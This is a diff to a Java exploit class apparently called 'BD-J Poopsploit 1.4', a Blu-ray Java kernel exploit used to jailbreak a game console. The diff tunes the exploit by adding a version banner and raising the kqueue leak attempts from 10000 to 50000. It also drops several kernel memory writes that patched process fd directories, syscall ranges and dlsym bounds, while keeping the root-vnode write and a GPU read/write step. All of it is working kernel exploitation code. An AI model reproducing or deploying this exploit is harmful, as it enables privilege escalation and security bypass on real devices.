@@ -15,6 +15,8 @@ import java.io.*;
 
 public class Poops {
     
+    private static final String VERSION_STRING = "BD-J Poopsploit 1.4";
+    
     private static final int KERNEL_PID = 0;
     
     private static final long SYSCORE_AUTHID = 0x4800000000000007L;
@@ -855,7 +857,7 @@ public class Poops {
         // Leak kqueue.
         int attempts = 0;
         int kq = 0;
-        while (attempts < 10000) {
+        while (attempts < 50000) {
             kq = kqueue();
 
             // Leak with other rthdr.
@@ -1299,20 +1301,7 @@ public class Poops {
         
         Status.println("bdj_vnode: " + Long.toHexString(bdj_vnode));
         
-        kapi.kwrite64(p_fd + 0x08, rootvnode); // fd_cdir
         kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
-        kapi.kwrite64(p_fd + 0x18, 0); // fd_jdir
-
-        // Allow syscall from everywhere.
-        long p_dynlib = kapi.kread64(p + 0x3e8);
-        kapi.kwrite64(p_dynlib + 0xf0, 0); // start
-        kapi.kwrite64(p_dynlib + 0xf8, 0xFFFFFFFFFFFFFFFFL); // end
-        
-        // Allow dlsym.
-        long dynlib_eboot = kapi.kread64(p_dynlib + 0x00);
-        long eboot_segments = kapi.kread64(dynlib_eboot + 0x40);
-        kapi.kwrite64(eboot_segments + 0x08, 0); // addr
-        kapi.kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFFL); // size 
         
         if (!GPU.run(kdata_base, curproc)) {
             Status.println("GPU rw failed");
@@ -1397,6 +1386,7 @@ public class Poops {
     
     public static void main(String[] args) {
         Status.setNetworkLoggerEnabled(false);
+        Status.info(VERSION_STRING);
         
         if (kapi.getKdataBase() != 0) {
             Status.success("Already jailbroken");
